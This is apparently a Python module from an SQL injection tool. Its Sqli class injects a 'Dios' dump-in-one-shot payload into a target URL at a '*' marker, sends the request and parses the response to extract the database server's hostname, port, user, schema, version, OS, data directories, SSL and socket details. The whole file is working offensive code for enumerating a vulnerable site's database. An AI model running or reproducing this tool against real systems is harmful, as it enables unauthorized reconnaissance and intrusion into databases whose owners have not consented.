import re
import requests
from .Dios import Dios

class Sqli:

    def __init__(self, url):
      self.url= url

    def information(self, level=1):
        dios = Dios().get_information()
        response = requests.get(self.url.replace('*',dios))

        if level == 1:
            sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",response.text)
            if ( sqli_helper ):
                sqli_helper = sqli_helper.group(1)

                hostname        = re.search("<hostname\(\)>(.*)</hostname\(\)>", sqli_helper)
                port            = re.search("<port\(\)>(.*)</port\(\)>", sqli_helper)
                user            = re.search("<user\(\)>(.*)</user\(\)>", sqli_helper)
                schema          = re.search("<schema\(\)>(.*)</schema\(\)>", sqli_helper)
                version         = re.search("<version>(.*)</version>", sqli_helper)
                os_version      = re.search("<os_version>(.*)</os_version>", sqli_helper)
                mechine_version = re.search("<mechine_version>(.*)</mechine_version>", sqli_helper)
                base_dir        = re.search("<base_dir>(.*)</base_dir>", sqli_helper)
                data_dir        = re.search("<data_dir>(.*)</data_dir>", sqli_helper)
                ssl             = re.search("<ssl>(.*)</ssl>", sqli_helper)
                openssl         = re.search("<openssl>(.*)</openssl>", sqli_helper)
                symlink         = re.search("<symlink>(.*)</symlink>", sqli_helper)
                socket          = re.search("<socket>(.*)</socket>", sqli_helper)

                hostname        = hostname.group(1)         if bool(hostname)           else "can't get information"
                port            = port.group(1)             if bool(port)               else "can't get information"
                user            = user.group(1)             if bool(user)               else "can't get information"
                schema          = schema.group(1)           if bool(schema)             else "can't get information"
                version         = version.group(1)          if bool(version)            else "can't get information"
                os_version      = os_version.group(1)       if bool(os_version)         else "can't get information"
                mechine_version = mechine_version.group(1)  if bool(mechine_version)    else "can't get information"
                base_dir        = base_dir.group(1)         if bool(base_dir)           else "can't get information"
                data_dir        = data_dir.group(1)         if bool(data_dir)           else "can't get information"
                ssl             = ssl.group(1)              if bool(ssl)                else "can't get information"
                openssl         = openssl.group(1)          if bool(openssl)            else "can't get information"
                symlink         = symlink.group(1)          if bool(symlink)            else "can't get information"
                socket          = socket.group(1)           if bool(socket)             else "can't get information"

                
            else:
                return {
                    "status": False,
                    "message": "Response sql injectin do not match"
                }

        return {
                    "hostname": hostname,
                    "port": port,
                    "user": user,
                    "schema": schema,
                    "version": version,
                    "os_version": os_version,
                    "mechine_version": mechine_version,
                    "base_dir": base_dir,
                    "data_dir": data_dir,
                    "ssl": ssl,
                    "openssl": openssl,
                    "symlink": symlink,
                    "socket": socket }